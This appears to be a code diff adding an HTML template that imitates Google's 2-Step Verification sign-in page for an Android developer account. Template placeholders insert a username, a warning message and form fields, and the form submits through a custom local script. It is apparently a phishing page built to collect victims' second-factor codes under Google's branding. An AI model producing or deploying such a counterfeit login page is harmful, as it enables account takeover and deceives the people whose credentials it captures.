@@ -1,0 +1,89 @@
+<html lang="en" dir="ltr" class="CMgTXc">
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <link rel="shortcut icon" href="//www.google.com/favicon.ico">
+        <meta content="width=300, initial-scale=1" name="viewport">
+        <meta name="robots" content="noindex">
+        <meta name="google-site-verification" content="LrdTUW9psUAMbh4Ia074-BPEVmcpBxF6Gwf0MSgQXZs">
+        <title>Google Accounts</title>
+        <style>
+            @font-face {
+              font-family: 'Open Sans';
+              font-style: normal;
+              font-weight: 300;
+              src: local('Open Sans Light'), local('OpenSans-Light'), url(//fonts.gstatic.com/s/opensans/v13/DXI1ORHCpsQm3Vp6mXoaTYnF5uFdDttMLvmWuJdhhgs.ttf) format('truetype');
+            }
+            @font-face {
+              font-family: 'Open Sans';
+              font-style: normal;
+              font-weight: 400;
+              src: local('Open Sans'), local('OpenSans'), url(//fonts.gstatic.com/s/opensans/v13/cJZKeOuBrn4kERxqtaUH3aCWcynf_cDxXwCLxiixG1c.ttf) format('truetype');
+            }
+        </style>
+        <link rel="stylesheet" href="https://ssl.gstatic.com/accounts/static/_/ss/k=gaia.gaiafe_signin.-1qoadjkiewybh.L.W.O/am=AAAAAACgAQ/d=0/rs=ABkqax0AVJkCora-mqlNvYVvbztUz0TXyA" type="text/css">
+        <script src="/static/js/IframePage.js" type="text/javascript"></script>
+    </head>
+    <body id="yDmH0d" ng-controller="IframeCtrl">
+        <div class="s2h6df">
+            <div class="JYXKFb IA6off">
+                <div class="ql1pVb ZnXjYc EaNIqc">
+                    <div class="omTHz" aria-label="Google">
+
+                    </div>
+                </div>
+            </div>
+            <div class="RgEUV ZnXjYc EaNIqc">
+                <div class="glT6eb">
+                    <div jsname="IDL96d">
+                        <h1>2-Step Verification</h1>
+                    </div>
+                    <div jsname="jqgtP">
+                        <h2>Use your device to sign in to your Google Account.</h2>
+                    </div>
+                </div>
+                {{warningMsg}}
+                <div class="LJtPoc" jsname="Ki8mld">
+                    <form id="challenge" onsubmit='return verficationAccount()' jsname="rzWj5">
+                        <input name="challengeId" type="hidden" id="challengeId" value="838">
+                        <input name="challengeType" type="hidden" id="challengeType" value="9">
+                        <input name="continue" type="hidden" value="https://play.google.com/apps/publish/?hl=en#">
+                        <input name="service" type="hidden" value="androiddeveloper">
+                        <input name="hl" type="hidden" value="en">
+                        <input name="checkedDomains" type="hidden" value="youtube">
+                        <input name="checkConnection" type="hidden" value="youtube:46:1">
+                        <input name="pstMsg" type="hidden" value="1">
+                        <input type="hidden" name="gxf" id="gxf" value="AFoagUXovnlNe8MU7s-iLnm6OjDpbMIlTQ:1452854631912">
+                        {{form}}
+                    </form>
+                </div>
+                <div class="pjP5m">
+                    <form method="POST" action="/signin/selectchallenge">
+                        <input id="selectChallenge" class="g1C42c" value="Try another way to sign in">
+                        <input type="hidden" name="gxf" id="gxf" value="AFoagUXovnlNe8MU7s-iLnm6OjDpbMIlTQ:1452854631912">
+                        <input name="continue" type="hidden" value="https://play.google.com/apps/publish/?hl=en#">
+                        <input name="service" type="hidden" value="androiddeveloper">
+                        <input name="hl" type="hidden" value="en">
+                        <input name="checkedDomains" type="hidden" value="youtube">
+                        <input name="checkConnection" type="hidden" value="youtube:46:1">
+                        <input name="pstMsg" type="hidden" value="1">
+                    </form>
+                </div>
+                <div class="M0leCe">Signing in as {{username}}</div>
+            </div>
+            <div class="zOB73">
+                <div class="SEK88d ZnXjYc EaNIqc">
+                    <ul id="footer-list">
+                        <li>Google</li>
+                        <li><a href="https://accounts.google.com/TOS?loc=US&amp;hl=en&amp;privacy=true" target="_blank">Privacy</a></li>
+                        <li><a href="https://accounts.google.com/TOS?loc=US&amp;hl=en" target="_blank">Terms</a></li>
+                    </ul>
+                    <div id="lang-vis-control" jscontroller="fBrDlb" jsaction="change:iktSbe">
+                        <span id="lang-chooser-wrap" class="KQh9Y"><label for="lang-chooser"><img src="//ssl.gstatic.com/images/icons/ui/common/universal_language_settings-21.png" alt="Change language"></label></span>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="lDwpOe"></div>
+    </body>
+</html>
